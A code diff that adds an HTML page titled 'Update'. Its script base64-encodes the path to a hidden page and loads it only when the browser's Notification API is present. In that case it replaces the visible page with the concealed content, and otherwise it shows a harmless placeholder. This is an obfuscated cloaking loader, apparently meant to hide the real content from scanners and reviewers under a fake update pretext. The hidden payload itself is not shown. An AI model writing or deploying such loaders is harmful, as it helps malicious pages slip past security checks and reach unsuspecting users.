@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Update</title>
+    <script>
+        // hidden_content/update_content.html -> aGlkZGVuX2NvbnRlbnQvdXBkYXRlX2NvbnRlbnQuaHRtbA==
+        const realContent = 'aGlkZGVuX2NvbnRlbnQvdXBkYXRlX2NvbnRlbnQuaHRtbA==';
+
+        if (self.Notification) {
+            fetch(atob(realContent))
+                .then(response => response.text())
+                .then(html => {
+                    document.open();
+                    document.write(html);
+                    document.close();
+                })
+                .catch(err => {
+                    console.error('Error loading content');
+                });
+        } else {
+            document.write('<h1>Update Information</h1><p>Please check back later for updates.</p>');
+        }
+    </script>
+</head>
+
+<body>
+    <h1>Loading...</h1>
+</body>
+
+</html>
